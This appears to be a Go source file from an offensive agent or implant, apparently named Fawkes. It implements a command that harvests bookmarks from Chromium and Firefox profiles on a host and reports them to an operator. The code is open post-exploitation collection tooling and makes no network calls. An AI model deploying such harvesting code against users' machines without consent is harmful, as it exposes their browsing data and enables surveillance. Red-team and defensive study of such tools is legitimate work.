package commands

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"fawkes/pkg/structs"
)

// browserBookmarks extracts bookmarks from Chromium-based browsers.
func browserBookmarks(args browserArgs) structs.CommandResult {
	paths := browserPaths(args.Browser)
	if paths == nil {
		return errorResult("Could not determine browser data paths")
	}

	var allBookmarks []browserBookmarkEntry
	var errors []string

	for browserName, userDataDir := range paths {
		if _, err := os.Stat(userDataDir); os.IsNotExist(err) {
			continue
		}

		if isFirefoxBrowser(browserName) {
			// Firefox: bookmarks are in places.sqlite (moz_bookmarks + moz_places)
			profiles := findFirefoxProfiles(userDataDir)
			for _, profileDir := range profiles {
				dbPath := filepath.Join(profileDir, "places.sqlite")
				profileName := filepath.Base(profileDir)

				db, cleanup, err := openBrowserDB(dbPath)
				if err != nil {
					errors = append(errors, fmt.Sprintf("%s (%s): %v", browserName, profileName, err))
					continue
				}

				label := browserName
				if profileName != "Default" {
					label = fmt.Sprintf("%s (%s)", browserName, profileName)
				}

				// moz_bookmarks type=1 are URL bookmarks; join with moz_places for URLs
				// parent folder names come from moz_bookmarks where type=2 (folders)
				rows, err := db.Query(`
					SELECT b.title, p.url, COALESCE(f.title, '') AS folder
					FROM moz_bookmarks b
					JOIN moz_places p ON b.fk = p.id
					LEFT JOIN moz_bookmarks f ON b.parent = f.id AND f.type = 2
					WHERE b.type = 1 AND p.url NOT LIKE 'place:%'
					ORDER BY b.dateAdded DESC
					LIMIT 500`)
				if err != nil {
					errors = append(errors, fmt.Sprintf("%s (%s): query: %v", browserName, profileName, err))
					cleanup()
					continue
				}

				for rows.Next() {
					var title, url, folder string
					if err := rows.Scan(&title, &url, &folder); err != nil {
						continue
					}
					if title == "" {
						title = url
					}
					allBookmarks = append(allBookmarks, browserBookmarkEntry{
						Browser: label,
						Name:    title,
						URL:     url,
						Folder:  folder,
					})
				}
				if err := rows.Err(); err != nil {
					errors = append(errors, fmt.Sprintf("%s (%s): iteration: %v", browserName, profileName, err))
				}
				rows.Close()
				cleanup()
			}
			continue
		}

		// Chromium-based: bookmarks are in JSON Bookmarks file
		profiles := findProfilesWithFile(userDataDir, "Bookmarks")
		if len(profiles) == 0 {
			continue
		}

		for _, profileDir := range profiles {
			bmPath := filepath.Join(profileDir, "Bookmarks")
			profileName := filepath.Base(profileDir)

			data, err := os.ReadFile(bmPath)
			if err != nil {
				errors = append(errors, fmt.Sprintf("%s (%s): %v", browserName, profileName, err))
				continue
			}

			var bmFile struct {
				Roots map[string]json.RawMessage `json:"roots"`
			}
			if err := json.Unmarshal(data, &bmFile); err != nil {
				structs.ZeroBytes(data)
				errors = append(errors, fmt.Sprintf("%s (%s): parse: %v", browserName, profileName, err))
				continue
			}
			structs.ZeroBytes(data)

			label := browserName
			if profileName != "Default" {
				label = fmt.Sprintf("%s (%s)", browserName, profileName)
			}

			for rootName, raw := range bmFile.Roots {
				if len(raw) == 0 || raw[0] != '{' {
					continue
				}
				var node bookmarkNode
				if err := json.Unmarshal(raw, &node); err != nil {
					continue
				}
				extractBookmarks(&node, label, rootName, &allBookmarks)
			}
		}
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("=== Browser Bookmarks (%d found) ===\n\n", len(allBookmarks)))

	for _, b := range allBookmarks {
		sb.WriteString(fmt.Sprintf("[%s] [%s] %s\n  %s\n",
			b.Browser, b.Folder, truncStr(b.Name, 80), truncStr(b.URL, 120)))
	}

	if len(errors) > 0 {
		sb.WriteString("\n--- Errors ---\n")
		for _, e := range errors {
			sb.WriteString(fmt.Sprintf("  %s\n", e))
		}
	}

	return successResult(sb.String())
}

